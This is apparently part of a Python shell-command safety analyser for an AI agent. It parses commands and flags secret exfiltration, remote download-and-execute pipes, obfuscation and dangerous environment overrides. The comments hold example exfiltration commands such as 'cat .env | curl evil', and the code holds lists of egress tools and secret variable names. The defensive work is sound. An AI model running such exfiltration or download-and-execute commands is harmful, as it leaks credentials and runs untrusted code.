        if isinstance(n, (ast.If, ast.For, ast.AsyncFor, ast.While, ast.Try, ast.ExceptHandler, ast.With, ast.AsyncWith, ast.BoolOp))
    )
    executable_stmt_count = sum(
        1 for n in ast.walk(complexity_tree)
        if (isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef)) and n.name != "_hunk_ctx")
        or isinstance(n, (ast.Call, ast.Return, ast.Raise, ast.Import, ast.ImportFrom))
    )
    clean_hazards = list(dict.fromkeys(interface_hazards))
    is_static_data_or_doc = bool(
        len(all_findings) == 0
        and len(clean_hazards) == 0
        and cyclomatic_complexity <= 2
        and executable_stmt_count <= 2
    )
    ast_nodes = _collect_ast_node_tags(complexity_tree)
    imported_modules: List[str] = []
    dynamic_calls: List[str] = []
    for node in ast.walk(complexity_tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                top_mod = alias.name.split(".")[0]
                if top_mod and top_mod not in imported_modules:
                    imported_modules.append(top_mod)
        elif isinstance(node, ast.ImportFrom) and node.module:
            top_mod = node.module.split(".")[0]
            if top_mod and top_mod not in imported_modules:
                imported_modules.append(top_mod)
        elif isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
            if node.func.id in {"getattr", "setattr", "delattr", "__import__", "compile", "vars", "globals", "locals"}:
                if node.func.id not in dynamic_calls:
                    dynamic_calls.append(node.func.id)

    return {
        "language": "python",
        "syntax_valid": True,
        "security_clean": len(all_findings) == 0,
        "findings": all_findings,
        "interface_hazards": clean_hazards,
        "line_count": line_count,
        "ast_nodes": ast_nodes,
        "cyclomatic_complexity": cyclomatic_complexity,
        "is_static_data_or_doc": is_static_data_or_doc,
        "context_ast_parsed": context_ast_parsed,
        "patched_file_ast_verified": patched_file_ast_verified,
        "imported_modules": imported_modules,
        "dynamic_calls": dynamic_calls,
        "structural_context": structural_findings,
    }


def _clean_shell_grouping(seg: str) -> str:
    """Strip bash subshell `(...)` and brace-group `{ ...; }` wrappers from a pipe segment.

    Examples:
        ``(cat .env)``  → ``cat .env``
        ``{ cat .env; }`` → ``cat .env``
        ``cat .env``    → ``cat .env``  (unchanged)
    """
    cleaned = seg.strip()
    while True:
        if cleaned.startswith("(") and cleaned.endswith(")"):
            cleaned = cleaned[1:-1].strip()
            if cleaned.endswith(";"):
                cleaned = cleaned[:-1].strip()
        elif cleaned.startswith("{") and cleaned.endswith("}"):
            cleaned = cleaned[1:-1].strip()
            if cleaned.endswith(";"):
                cleaned = cleaned[:-1].strip()
        else:
            break
    return cleaned


def _split_command_pipeline_blocks(cmd: str) -> List[str]:
    """Split a command into logical pipeline blocks on logical operators (&&, ||, ;, newline)

    respecting single/double quotes, backslash escapes, and parenthesis/brace groupings so that
    quoted regexes (`grep -E "foo|bar"`) and subshells (`(cat .env; echo x) | curl`) stay intact.
    """
    blocks: List[str] = []
    curr: List[str] = []
    depth_paren = 0
    depth_brace = 0
    in_single = False
    in_double = False
    i = 0
    n = len(cmd)
    while i < n:
        ch = cmd[i]
        if in_single:
            curr.append(ch)
            if ch == "'":
                in_single = False
            i += 1
        elif in_double:
            if ch == "\\" and i + 1 < n and cmd[i + 1] in ('"', "\\", "$", "`", "\n"):
                curr.append(ch)
                curr.append(cmd[i + 1])
                i += 2
            else:
                curr.append(ch)
                if ch == '"':
                    in_double = False
                i += 1
        elif ch == "\\" and i + 1 < n:
            curr.append(ch)
            curr.append(cmd[i + 1])
            i += 2
        elif ch == "'":
            in_single = True
            curr.append(ch)
            i += 1
        elif ch == '"':
            in_double = True
            curr.append(ch)
            i += 1
        elif ch == "(":
            depth_paren += 1
            curr.append(ch)
            i += 1
        elif ch == ")":
            if depth_paren > 0:
                depth_paren -= 1
            curr.append(ch)
            i += 1
        elif ch == "{":
            depth_brace += 1
            curr.append(ch)
            i += 1
        elif ch == "}":
            if depth_brace > 0:
                depth_brace -= 1
            curr.append(ch)
            i += 1
        elif depth_paren == 0 and depth_brace == 0:
            if cmd[i : i + 2] in ("&&", "||"):
                blocks.append("".join(curr).strip())
                curr = []
                i += 2
            elif ch in (";", "\n", "\r"):
                blocks.append("".join(curr).strip())
                curr = []
                i += 1
            else:
                curr.append(ch)
                i += 1
        else:
            curr.append(ch)
            i += 1
    if curr:
        blocks.append("".join(curr).strip())
    return [b for b in blocks if b]


def _split_unquoted_pipes(block: str) -> List[str]:
    """Split a pipeline block on unquoted `|` / `|&` without breaking regexes like `grep -E "a|b"`."""
    segs: List[str] = []
    curr: List[str] = []
    in_single = False
    in_double = False
    i = 0
    n = len(block)
    while i < n:
        ch = block[i]
        if in_single:
            curr.append(ch)
            if ch == "'":
                in_single = False
            i += 1
        elif in_double:
            if ch == "\\" and i + 1 < n and block[i + 1] in ('"', "\\", "$", "`", "\n"):
                curr.append(ch)
                curr.append(block[i + 1])
                i += 2
            else:
                curr.append(ch)
                if ch == '"':
                    in_double = False
                i += 1
        elif ch == "\\" and i + 1 < n:
            curr.append(ch)
            curr.append(block[i + 1])
            i += 2
        elif ch == "'":
            in_single = True
            curr.append(ch)
            i += 1
        elif ch == '"':
            in_double = True
            curr.append(ch)
            i += 1
        elif block.startswith("|&", i):
            segs.append("".join(curr))
            curr = []
            i += 2
        elif ch == "|":
            segs.append("".join(curr))
            curr = []
            i += 1
        else:
            curr.append(ch)
            i += 1
    if in_single or in_double:
        return block.replace("|&", "|").split("|")
    if curr or segs:
        segs.append("".join(curr))
    return segs


def _tokenize_shell_segment(seg: str) -> List[str]:
    try:
        return shlex.split(seg, posix=True)
    except ValueError:
        return seg.strip().split()


SAFE_SHELL_COMMANDS: Set[str] = {
    "ls", "pwd", "echo", "cat", "head", "tail", "wc", "sort", "uniq",
    "grep", "rg", "find", "which", "where", "whoami", "date",
    "clang-format", "black", "ruff", "mypy", "pytest",
    "jq", "yq", "column", "cut", "tr",
}
SAFE_DEV_SHELL_COMMANDS: Set[str] = {
    "mkdir", "touch", "cp", "mv", "rm", "rmdir", "npm", "pnpm", "yarn", "cargo", "pip", "poetry",
}
SAFE_GIT_SUBCOMMANDS: Set[str] = {
    "status", "log", "diff", "branch", "show", "rev-parse", "describe", "ls-files",
}
SAFE_DEV_GIT_SUBCOMMANDS: Set[str] = {
    "add", "commit", "checkout", "switch", "stash", "fetch", "pull", "merge", "tag", "clean",
}

_SAFE_ANALYTICAL_TOOLS: Set[str] = {
    "grep", "rg", "wc", "sort", "uniq", "head", "tail", "cat", "column", "cut", "tr", "jq", "yq", "file",
}

_SHELL_WRAPPER_COMMANDS: Set[str] = {
    "env", "command", "nohup", "nice", "timeout", "time", "sudo", "doas", "exec", "strace", "xargs",
}
_DANGEROUS_ENV_OVERRIDES: Set[str] = {
    "LD_PRELOAD", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES", "DYLD_LIBRARY_PATH",
    "PYTHONPATH", "PYTHONSTARTUP", "BASH_ENV", "ENV", "NODE_OPTIONS", "PERL5OPT", "RUBYOPT",
}
_SHELL_MUTATING_COMMANDS: Set[str] = {
    "rm", "mv", "cp", "chmod", "chown", "sed", "awk", "perl", "tee",
    "truncate", "shred", "dd", "ln", "touch", "del", "erase", "rmdir", "rd",
}
_SHELL_SECRET_EGRESS_COMMANDS: Set[str] = {
    "echo", "printf", "printenv", "curl", "wget", "nc", "ncat", "netcat",
    "socat", "ssh", "scp", "rsync", "ftp", "sftp", "iwr", "irm",
    "invoke-webrequest", "invoke-restmethod", "write-output", "write-host",
}
_SENSITIVE_ENV_VAR_RE = re.compile(
    r"(?i)(?:^|_)(?:"
    r"SECRET|TOKEN|PASSWORD|PASSWD|CREDENTIAL|CREDENTIALS|APIKEY|API_KEY|PRIVATE_KEY|"
    r"ACCESS_KEY|CLIENT_SECRET|AUTH_TOKEN|AUTH_HEADER|BEARER|JWT|SESSION_TOKEN|"
    r"BOT_TOKEN|SIGNING_KEY|ENCRYPTION_KEY|MASTER_KEY|DATABASE_URL|DB_PASSWORD|"
    r"DB_PASS|REDIS_URL|STRIPE_KEY|OPENAI_API_KEY|ANTHROPIC_API_KEY|GEMINI_API_KEY|"
    r"AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|GITHUB_TOKEN|GH_TOKEN|GITLAB_TOKEN|"
    r"HF_TOKEN|NPM_TOKEN|PYPI_TOKEN|API_SECRET|SECRET_KEY"
    r")(?:$|_)"
)
_PROC_ENVIRON_RE = re.compile(r"(?:^|/)proc/(?:self|thread-self|\d+)/environ(?:$|/)", re.IGNORECASE)
_ENV_ASSIGN_TOKEN_RE = re.compile(r"^([A-Za-z_][A-Za-z0-9_]*)=(.*)$")


def _has_unsafe_shell_metachar(cmd: str) -> Optional[str]:
    """Detect unquoted/expandable shell substitution (`$(...)`, backticks, `$'...'`, `<(...)`, complex `${...}`)."""
    in_single = False
    in_double = False
    escaped = False
    i = 0
    n = len(cmd)
    while i < n:
        ch = cmd[i]
        if escaped:
            escaped = False
            i += 1
            continue
        if in_single:
            if ch == "'":
                in_single = False
            i += 1
            continue
        if ch == "\\":
            escaped = True
            i += 1
            continue
        if ch == '"' and not in_single:
            in_double = not in_double
            i += 1
            continue
        if ch == "'" and not in_double:
            in_single = True
            i += 1
            continue
        if not in_single:
            if ch == "`":
                return "shell_backtick_substitution"
            if ch == "$" and i + 1 < n and cmd[i + 1] == "(":
                return "shell_command_substitution"
            if ch == "$" and not in_double and i + 1 < n and cmd[i + 1] == "'":
                return "shell_ansi_c_quoting"
            if ch == "<" and not in_double and i + 1 < n and cmd[i + 1] == "(":
                return "shell_process_substitution"
            if ch == "$" and i + 1 < n and cmd[i + 1] == "{":
                close = cmd.find("}", i + 2)
                if close != -1:
                    inner = cmd[i + 2 : close]
                    if inner.startswith("!") or ":" in inner or "/" in inner:
                        return "shell_parameter_expansion_obfuscation"
        i += 1
    return None


def _extract_shell_redirections(cmd: str) -> List[Dict[str, str]]:
    """Extract unquoted output redirections (`>`, `>>`, `2>&1`, `>(...)`) from a shell string."""
    redirs: List[Dict[str, str]] = []
    in_single = False
    in_double = False
    escaped = False
    i = 0
    n = len(cmd)

    while i < n:
        ch = cmd[i]
        if escaped:
            escaped = False
            i += 1
            continue
        if ch == "\\" and not in_single:
            escaped = True
            i += 1
            continue
        if ch == "'" and not in_double:
            in_single = not in_single
            i += 1
            continue
        if ch == '"' and not in_single:
            in_double = not in_double
            i += 1
            continue

        if not in_single and not in_double and ch == ">":
            amp_prefix = i > 0 and cmd[i - 1] == "&"
            j = i + 1
            if j < n and cmd[j] in (">", "|"):
                j += 1
            elif j < n and cmd[j] == "(":
                redirs.append({"kind": "process_substitution", "target": ""})
                i = j + 1
                continue

            is_amp_after = False
            if j < n and cmd[j] == "&":
                is_amp_after = True
                j += 1

            while j < n and cmd[j] in (" ", "\t"):
                j += 1

            tok_chars: List[str] = []
            t_sq = False
            t_dq = False
            t_esc = False
            while j < n:
                tc = cmd[j]
                if t_esc:
                    tok_chars.append(tc)
                    t_esc = False
                    j += 1
                    continue
                if tc == "\\" and not t_sq:
                    t_esc = True
                    j += 1
                    continue
                if tc == "'" and not t_dq:
                    t_sq = not t_sq
                    j += 1
                    continue
                if tc == '"' and not t_sq:
                    t_dq = not t_dq
                    j += 1
                    continue
                if not t_sq and not t_dq and (tc.isspace() or tc in ";|&<>()"):
                    break
                tok_chars.append(tc)
                j += 1

            target = "".join(tok_chars)
            if is_amp_after and not amp_prefix and re.fullmatch(r"(?:\d+|-)", target):
                redirs.append({"kind": "fd_dup", "target": target})
            else:
                redirs.append({"kind": "file", "target": target})
            i = j
            continue

        i += 1
    return redirs


_PRIVILEGED_SYSTEM_PREFIXES: Tuple[str, ...] = (
    "~/",
    "/etc/",
    "/bin/",
    "/sbin/",
    "/usr/",
    "/var/",
    "/root/",
    "/boot/",
    "/sys/",
    "/proc/",
    "/lib/",
    "/opt/",
    "c:/windows",
    "c:/system32",
    "c:/program files",
)

_PRIVILEGED_BASENAMES: Set[str] = {
    ".bashrc",
    ".zshrc",
    ".profile",
    ".bash_profile",
    ".zprofile",
    "authorized_keys",
    "passwd",
    "shadow",
    "sudoers",
}


def _is_privileged_or_unsafe_redirect_target(target: str) -> bool:
    """Return True if an output redirection target must trigger a hard Layer 1 deny."""
    t = str(target or "").strip()
    if not t:
        return True
    if any(ch in t for ch in ("$", "`", "*", "?")):
        return True
    t_norm = t.replace("\\", "/")
    t_low = t_norm.lower()
    if t_low == "/dev/null":
        return False
    if t_low.startswith("/dev/") or t_low.startswith("//./") or t.startswith("\\\\.\\"):
        return True
    if t_low in {"/", "~", "~/", "/etc", "c:", "c:/"} or t_low.startswith(_PRIVILEGED_SYSTEM_PREFIXES):
        return True
    if ".." in [seg for seg in t_norm.split("/") if seg]:
        return True
    if os.path.basename(t_low) in _PRIVILEGED_BASENAMES:
        return True
    if is_protected_path(t):
        return True
    return False


def _is_command_allowlisted(exe: str, args: List[str], policy: Optional[PolicyConfig] = None) -> bool:
    """Strict Layer 1 allowlist check for a parsed command executable and its arguments."""
    cfg = policy or DEFAULT_POLICY
    is_dev = getattr(cfg, "profile", "strict") == "dev"
    args_lower = [a.lower() for a in args]
    if exe in SAFE_SHELL_COMMANDS:
        if exe == "find" and any(a in {"-exec", "-execdir", "-ok", "-okdir", "-delete"} for a in args_lower):
            return False
        if exe == "pytest" and "--capture=sys" in args_lower:
            return True
        return True
    if is_dev and exe in SAFE_DEV_SHELL_COMMANDS:
        if exe == "rm":
            # In dev profile, rm is only allowed for non-recursive single files
            has_rec = any(a == "--recursive" or (a.startswith("-") and not a.startswith("--") and ("r" in a or "R" in a)) for a in args)
            return not has_rec
        return True
    if exe == "git":
        if not args_lower:
            return True
        if any(a == "-c" or a.startswith("--exec") or a == "--ext-diff" for a in args_lower):
            return False
        if args_lower[0] in SAFE_GIT_SUBCOMMANDS:
            return True
        if is_dev and args_lower[0] in SAFE_DEV_GIT_SUBCOMMANDS:
            # git clean in dev profile must not allow destructive flags (-f, -d, -x, -X) which delete untracked/ignored files
            if args_lower[0] == "clean":
                if any(a.startswith("-") and not a.startswith("--") and any(ch in a for ch in "fdxX") for a in args_lower[1:]):
                    return False
                if any(a in {"--force", "-f", "-d", "-x", "-X"} for a in args_lower[1:]):
                    return False
            return True
        return False
    if exe in {"python", "python3"}:
        if args_lower in (["--version"], ["-v"]):
            return True
        if len(args_lower) >= 2 and args_lower[0] == "-m":
            mod_target = args_lower[1].replace("-", "_")
            if mod_target in {"http.server", "http_server", "pydoc"}:
                return False
            if mod_target in {"pytest", "unittest", "py_compile"}:
                return True
            if mod_target == "aetheris_microbrains.audit":
                # Local package audit CLI (audit --last/--tail/--summary): read-only self-inspection.
                return True
            if mod_target == "pip" or mod_target.startswith("pip."):
                if is_dev and mod_target == "pip":
                    return True
                # Read-only pip introspection is safe in any profile; anything else stays dev-only.
                sub = args_lower[2] if len(args_lower) > 2 else ""
                return sub in {"show", "list", "--version"}
            return False
        if is_dev and len(args_lower) >= 1:
            # Clustered or standalone short flags: -c, -Bc, -uc, -c<code>, etc.
            has_c_flag = any(
                a.startswith("-") and not a.startswith("--") and "c" in a
                for a in args_lower
            )
            has_server = any(a in {"http.server", "http_server", "pydoc"} for a in args_lower)
            if not has_c_flag and not has_server:
                return True
        return False
    return False


def _extract_unquoted_env_vars(cmd: str) -> List[str]:
    """Extract environment variable names expanded outside single quotes (`$VAR`, `${VAR}`, `$env:VAR`, `%VAR%`)."""
    found: List[str] = []
    in_single = False
    escaped = False
    i = 0
    n = len(cmd)
    while i < n:
        ch = cmd[i]
        if escaped:
            escaped = False
            i += 1
            continue
        if ch == "\\" and not in_single:
            escaped = True
            i += 1
            continue
        if ch == "'":
            in_single = not in_single
            i += 1
            continue
        if not in_single:
            if ch == "$" and i + 1 < n:
                rest = cmd[i + 1 :]
                m_ps = re.match(r"env:([A-Za-z_][A-Za-z0-9_]*)", rest, re.IGNORECASE)
                if m_ps:
                    var = m_ps.group(1)
                    if var not in found:
                        found.append(var)
                    i += 1 + m_ps.end()
                    continue
                if rest.startswith("{"):
                    m_br = re.match(r"\{([A-Za-z_][A-Za-z0-9_]*)", rest)
                    if m_br:
                        var = m_br.group(1)
                        if var not in found:
                            found.append(var)
                        i += 1 + m_br.end()
                        continue
                m_var = re.match(r"([A-Za-z_][A-Za-z0-9_]*)", rest)
                if m_var:
                    var = m_var.group(1)
                    if var not in found:
                        found.append(var)
                    i += 1 + m_var.end()
                    continue
            elif ch == "%" and i + 2 < n:
                m_win = re.match(r"%([A-Za-z_][A-Za-z0-9_]*)%", cmd[i:])
                if m_win:
                    var = m_win.group(1)
                    if var not in found:
                        found.append(var)
                    i += m_win.end()
                    continue
        i += 1
    return found


def _expand_bash_braces(text: str) -> List[str]:
    """Expand bash-style brace expansions like `{a,b}`, `prefix{1,2}`, or `{.env,.npmrc}`."""
    m = re.search(r"\{([^{}]+)\}", text)
    if not m:
        return [text]
    options = m.group(1).split(",")
    if len(options) == 1:
        if ".." in options[0]:
            parts = options[0].split("..")
            if len(parts) == 2 and parts[0].isdigit() and parts[1].isdigit():
                start, end = int(parts[0]), int(parts[1])
                step = 1 if start <= end else -1
                options = [str(i) for i in range(start, end + step, step)]
            else:
                return [text]
        else:
            return [text]
    prefix = text[:m.start()]
    suffix = text[m.end():]
    results: List[str] = []
    for opt in options:
        results.extend(_expand_bash_braces(prefix + opt + suffix))
    return results


def _extract_candidate_paths_from_arg(arg: str) -> List[str]:
    """Extract filesystem path candidates from a shell argument (flags, `<file`, `rev:path`, bash braces)."""
    cleaned = str(arg or "").strip()
    if not cleaned:
        return []
    if cleaned.startswith("<"):
        cleaned = cleaned.lstrip("<").strip()
        if not cleaned:
            return []
    if cleaned.startswith("@"):
        cleaned = cleaned.lstrip("@").strip()
        if not cleaned:
            return []
    candidates: List[str] = []
    if "=" in cleaned:
        rhs = cleaned.split("=", 1)[1].strip()
        if rhs.startswith("@"):
            rhs = rhs.lstrip("@").strip()
        if rhs:
            candidates.append(rhs)
    if cleaned.startswith("-"):
        base_cands = candidates
    else:
        base_cands = candidates + [cleaned]
        low = cleaned.lower()
        if (
            ":" in cleaned
            and not low.startswith(("http://", "https://"))
            and not re.match(r"^[A-Za-z]:[/\\]", cleaned)
        ):
            after_colon = cleaned.split(":", 1)[1].strip()
            if after_colon:
                base_cands.append(after_colon)

    final_cands: List[str] = []
    for c in base_cands:
        final_cands.append(c)
        if "{" in c and "}" in c:
            for exp in _expand_bash_braces(c):
                if exp != c:
                    final_cands.append(exp)
    return list(dict.fromkeys(final_cands))


def _unwrap_shell_prefix(tokens: List[str]) -> Tuple[List[str], List[str], List[str], bool, bool]:
    """Unwrap inline `VAR=val` assignments and wrapper commands (`env`, `sudo`, `timeout`, `nohup`, ...)."""
    idx = 0
    n = len(tokens)
    wrappers_seen: List[str] = []
    wrapper_findings: List[str] = []
    had_inline_env = False
    last_wrapper = ""

    while idx < n:
        m_env = _ENV_ASSIGN_TOKEN_RE.match(tokens[idx])
        if not m_env:
            break
        had_inline_env = True
        var_name = m_env.group(1).upper()
        if var_name in _DANGEROUS_ENV_OVERRIDES:
            flag = f"dangerous_env_override:{var_name}"
            if flag not in wrapper_findings:
                wrapper_findings.append(flag)
        idx += 1

    while idx < n:
        exe = os.path.basename(tokens[idx]).lower().removesuffix(".exe").removesuffix(".com")
        if exe not in _SHELL_WRAPPER_COMMANDS:
            break
        wrappers_seen.append(exe)
        last_wrapper = exe
        idx += 1

        if exe == "env":
            while idx < n:
                tok = tokens[idx]
                if tok == "--":
                    idx += 1
                    break
                if tok in {"-u", "-C", "-S", "--unset", "--chdir"}:
                    idx += 2
                    continue
                if tok.startswith("-"):
                    idx += 1
                    continue
                m_env = _ENV_ASSIGN_TOKEN_RE.match(tok)
                if m_env:
                    var_name = m_env.group(1).upper()
                    if var_name in _DANGEROUS_ENV_OVERRIDES:
                        flag = f"dangerous_env_override:{var_name}"
                        if flag not in wrapper_findings:
                            wrapper_findings.append(flag)
                    idx += 1
                    continue
                break
        elif exe == "timeout":
            while idx < n:
                tok = tokens[idx]
                if tok == "--":
                    idx += 1
                    break
                if tok in {"-s", "-k", "--signal", "--kill-after"}:
                    idx += 2
                    continue
                if tok.startswith("-"):
                    idx += 1
                    continue
                break
            if idx < n and re.fullmatch(r"\d+(?:\.\d+)?[smhd]?", tokens[idx].lower()):
                idx += 1
        elif exe == "nice":
            while idx < n:
                tok = tokens[idx]
                if tok == "--":
                    idx += 1
                    break
                if tok in {"-n", "--adjustment"}:
                    idx += 2
                    continue
                if tok.startswith("-"):
                    idx += 1
                    continue
                break
        elif exe in {"sudo", "doas"}:
            while idx < n:
                tok = tokens[idx]
                if tok == "--":
                    idx += 1
                    break
                if tok in {"-u", "-g", "-p", "-h", "-r", "-t", "-C", "-U", "--user", "--group", "--host"}:
                    idx += 2
                    continue
                if tok.startswith("-"):
                    idx += 1
                    continue
                m_env = _ENV_ASSIGN_TOKEN_RE.match(tok)
                if m_env:
                    var_name = m_env.group(1).upper()
                    if var_name in _DANGEROUS_ENV_OVERRIDES:
                        flag = f"dangerous_env_override:{var_name}"
                        if flag not in wrapper_findings:
                            wrapper_findings.append(flag)
                    idx += 1
                    continue
                break
        elif exe == "xargs":
            while idx < n:
                tok = tokens[idx]
                if tok == "--":
                    idx += 1
                    break
                if tok in {"-I", "-J", "-L", "-n", "-P", "-d", "-s", "-E", "-a", "--max-args", "--max-procs", "--replace", "--delimiter"}:
                    idx += 2
                    continue
                if tok.startswith("-"):
                    idx += 1
                    continue
                break
        elif exe == "strace":
            while idx < n:
                tok = tokens[idx]
                if tok == "--":
                    idx += 1
                    break
                if tok in {"-e", "-o", "-p", "-s", "-S", "-u", "-P", "-E"}:
                    if tok == "-E" and idx + 1 < n:
                        m_env = _ENV_ASSIGN_TOKEN_RE.match(tokens[idx + 1])
                        if m_env and m_env.group(1).upper() in _DANGEROUS_ENV_OVERRIDES:
                            flag = f"dangerous_env_override:{m_env.group(1).upper()}"
                            if flag not in wrapper_findings:
                                wrapper_findings.append(flag)
                    idx += 2
                    continue
                if tok.startswith("-"):
                    idx += 1
                    continue
                break
        else:
            while idx < n:
                tok = tokens[idx]
                if tok == "--":
                    idx += 1
                    break
                if tok.startswith("-"):
                    idx += 1
                    continue
                break

    bare_env_dump = bool(idx >= n and last_wrapper == "env")
    return tokens[idx:], wrappers_seen, wrapper_findings, bare_env_dump, had_inline_env


def _split_shell_subcommands(cmd: str) -> List[str]:
    """Split shell command on separators (&&, ||, |&, ;, |, newline) outside quotes."""
    parts: List[str] = []
    buf: List[str] = []
    in_single = False
    in_double = False
    i = 0
    n = len(cmd)

    while i < n:
        ch = cmd[i]
        if in_single:
            buf.append(ch)
            if ch == "'":
                in_single = False
            i += 1
        elif in_double:
            if ch == "\\" and i + 1 < n and cmd[i + 1] in ('"', "\\", "$", "`", "\n"):
                buf.append(ch)
                buf.append(cmd[i + 1])
                i += 2
            else:
                buf.append(ch)
                if ch == '"':
                    in_double = False
                i += 1
        else:
            if ch == "\\" and i + 1 < n:
                buf.append(ch)
                buf.append(cmd[i + 1])
                i += 2
            elif ch == "'":
                in_single = True
                buf.append(ch)
                i += 1
            elif ch == '"':
                in_double = True
                buf.append(ch)
                i += 1
            elif cmd.startswith(("&&", "||", "|&", "\r\n"), i):
                parts.append("".join(buf))
                buf = []
                i += 2
            elif ch in (";", "|", "\n"):
                parts.append("".join(buf))
                buf = []
                i += 1
            else:
                buf.append(ch)
                i += 1

    if in_single or in_double:
        # Unbalanced quotes: fail closed by falling back to raw separator splitting.
        return re.split(r"(?:&&|\|\||\|&|;|\||\r?\n)", cmd)

    if buf:
        parts.append("".join(buf))
    return parts


def analyze_shell_command(cmd_str: Optional[str], policy: Optional[PolicyConfig] = None) -> Dict[str, Any]:
    """Layer 1 structural POSIX/Windows shell parser using shlex tokenization.

    Combines explicit destructive pattern blocking, wrapper unwrapping (`env`, `sudo`,
    `timeout`), protected-path/environ screening, and strict allowlist recognition
    so unrecognized shell commands escalate rather than auto-allowing.
    """
    if not cmd_str or not str(cmd_str).strip():
        return {
            "is_safe": True,
            "allowlisted": True,
            "unrecognized_commands": [],
            "findings": [],
            "commands": [],
            "risk_class": "READ_ONLY",
            "protected_path_reads": [],
            "sensitive_env_access": False,
            "sensitive_env_vars": [],
        }

    cmd = str(cmd_str).strip()
    if "\x00" in cmd:
        return {
            "is_safe": False,
            "allowlisted": False,
            "unrecognized_commands": [],
            "findings": ["null_byte_in_shell_command"],
            "commands": [],
            "risk_class": "IRREVERSIBLE_DESTRUCTIVE",
            "protected_path_reads": [],
            "sensitive_env_access": False,
            "sensitive_env_vars": [],
        }
    lower_cmd = cmd.lower()

    # Check raw SQL destructive commands passed directly
    if re.search(r"\b(drop\s+database|truncate\s+table)\b", lower_cmd):
        return {
            "is_safe": False,
            "allowlisted": False,
            "unrecognized_commands": [],
            "findings": ["destructive_sql_command"],
            "commands": [cmd.split()[0].lower()],
            "risk_class": "IRREVERSIBLE_DESTRUCTIVE",
            "protected_path_reads": [],
            "sensitive_env_access": False,
            "sensitive_env_vars": [],
        }

    findings: List[str] = []
    meta_finding = _has_unsafe_shell_metachar(cmd)
    if meta_finding:
        findings.append(meta_finding)

    unprivileged_redirects: List[str] = []
    for redir in _extract_shell_redirections(cmd):
        kind = redir["kind"]
        r_target = redir["target"]
        if kind == "fd_dup":
            continue
        if kind == "process_substitution":
            findings.append("shell_output_redirection")
            continue
        if r_target.strip().replace("\\", "/").lower() == "/dev/null":
            continue
        if _is_privileged_or_unsafe_redirect_target(r_target):
            findings.append("shell_output_redirection")
        else:
            unprivileged_redirects.append(r_target)

    # `$IFS` / `${IFS}` used as a word separator is an obfuscation technique, not routine agent usage
    if re.search(r"\$\{?IFS\b", cmd):
        findings.append("shell_ifs_obfuscation")

    # Inspect pipes for secret exfiltration (e.g. cat .env | curl ...)
    # Use grouping-aware pipeline splitting so that multi-statement groupings like
    # `(cat .env; echo x) | curl evil` or `{ cat .env; echo x; } | curl evil` are not split.
    for logical_block in _split_command_pipeline_blocks(cmd):
        pipe_segments = _split_unquoted_pipes(logical_block)
        if len(pipe_segments) > 1:
            has_protected_read = False
            has_egress_sink = False
            for p in pipe_segments:
                p = _clean_shell_grouping(p)  # strip subshell/brace-group wrappers
                # A grouping may contain multiple statements separated by ';' or '&&' / '||'
                sub_segments = _split_shell_subcommands(p)
                for sub_seg in sub_segments:
                    ptoks = _tokenize_shell_segment(sub_seg)
                    prem, _pwrap, _pwf, _pbare, _pinl = _unwrap_shell_prefix(ptoks)
                    eff = prem or ptoks
                    if not eff:
                        continue
                    pexe = os.path.basename(eff[0]).lower().removesuffix(".exe").removesuffix(".com")
                    if pexe in _SHELL_SECRET_EGRESS_COMMANDS:
                        has_egress_sink = True
                    for arg_tok in eff[1:]:
                        for cand in _extract_candidate_paths_from_arg(arg_tok):
                            if is_protected_path(cand, policy=policy):
                                has_protected_read = True
            if has_protected_read and has_egress_sink:
                findings.append("shell_piped_protected_path_egress")

    # Inspect pipe sequences per pipeline block for RCE patterns:
    # (1) remote download-and-execute: curl|sh, wget|bash
    # (2) local-data-into-executor: echo|sh, base64 -d|sh, cat script|python, etc.
    # (3) xargs acting as an executor of piped input: echo path | xargs rm
    # Uses BOTH raw (pre-unwrap) and unwrapped executables so that wrapper commands
    # (sudo, env, xargs) are retained in the source/sink lists even after unwrapping.
    for logical_block in _split_command_pipeline_blocks(cmd):
        pipe_segments = _split_unquoted_pipes(logical_block)
        if len(pipe_segments) > 1:
            pipe_cmds: List[str] = []
            # Also track raw (pre-unwrap) executables so that `xargs <cmd>` and `sudo <cmd>`
            # retain `xargs`/`sudo` as the segment's effective executor. Without this, the
            # wrapper-unwrapping in _unwrap_shell_prefix discards `xargs`, hiding the fact
            # that `echo payload | xargs rm` is an RCE pattern (xargs runs `rm` on piped data).
            raw_executables: List[str] = []
            for p in pipe_segments:
                p = _clean_shell_grouping(p)  # strip subshell/brace-group wrappers
                sub_segments = _split_shell_subcommands(p)
                for sub_seg in sub_segments:
                    ptoks = _tokenize_shell_segment(sub_seg)
                    if ptoks:
                        raw_executables.append(
                            os.path.basename(ptoks[0]).lower().removesuffix(".exe").removesuffix(".com")
                        )
                    prem, _pwrap, _pwf, _pbare, _pinl = _unwrap_shell_prefix(ptoks)
                    eff = prem or ptoks
                    if eff:
                        pipe_cmds.append(os.path.basename(eff[0]).lower().removesuffix(".exe").removesuffix(".com"))
            # RCE sinks: any pipe destination (or later segment) that executes its input as code.
            # NOTE: `xargs <cmd>` is tokenized as ['xargs', '<cmd>']; only `xargs` lands in
            # pipe_cmds, so `xargs` is treated as a sink (it runs its arg on piped data).
            # NOTE: `tee` is intentionally NOT a sink — `echo x | tee file` is benign.
            _RCE_PIPE_SINKS = {
                "sh", "bash", "zsh", "dash", "ksh", "fish", "pwsh", "powershell",
                "python", "python3", "perl", "ruby", "node", "exec", "eval",
                "source", "xargs",
            }
            # Sources: segments producing attacker-controllable data flowing into an RCE sink.
            # Conservative list — only commands whose stdout is the *payload* being executed.
            # NOTE: `git`/`find`/`ls` are intentionally NOT sources: their stdout is filenames,
            # not shell code, so `git ls-files | xargs grep` is benign.
            _RCE_PIPE_SOURCES = {
                # Remote fetchers (existing remote_code_execution_pipe behavior).
                "curl", "wget",
                # Local data producers whose stdout can carry attacker-controlled shell code.
                "echo", "printf", "cat", "head", "tail", "sed", "awk", "cut", "tr",
                "base64", "base32", "openssl", "xxd", "od", "jq", "yq",
            }
            # Use a UNION of raw_executables (pre-unwrap) and pipe_cmds (post-unwrap) so that
            # both `echo payload | xargs rm` (xargs unwrapped away) AND `env curl | env sh`
            # (env unwrapped away) are detected.
            all_executors = list(dict.fromkeys(raw_executables + pipe_cmds))  # de-dup, preserve order
            # Source = any non-final segment; Sink = any non-first segment.
            sources = all_executors[:-1]
